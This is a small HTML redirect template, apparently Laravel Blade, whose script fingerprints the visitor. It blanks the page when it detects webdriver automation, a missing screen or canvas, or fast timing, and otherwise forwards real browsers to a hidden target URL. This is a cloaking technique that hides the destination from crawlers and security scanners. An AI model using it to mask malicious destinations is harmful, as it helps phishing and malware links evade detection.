<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex, nofollow">
</head>
<body>
<script>
(function(){
  var t=Date.now(),s=window.screen,n=navigator;
  if(!s||!s.width||!n.languages||n.webdriver===true){
    document.body.innerHTML='';return;
  }
  var c=document.createElement('canvas'),g=c.getContext('2d');
  if(!g||typeof g.fillText!=='function'){
    document.body.innerHTML='';return;
  }
  setTimeout(function(){
    if(Date.now()-t<5) return;
    window.location.replace({!! json_encode($targetUrl) !!});
  },150);
})();
</script>
<noscript><p>Please enable JavaScript to continue.</p></noscript>
</body>
</html>
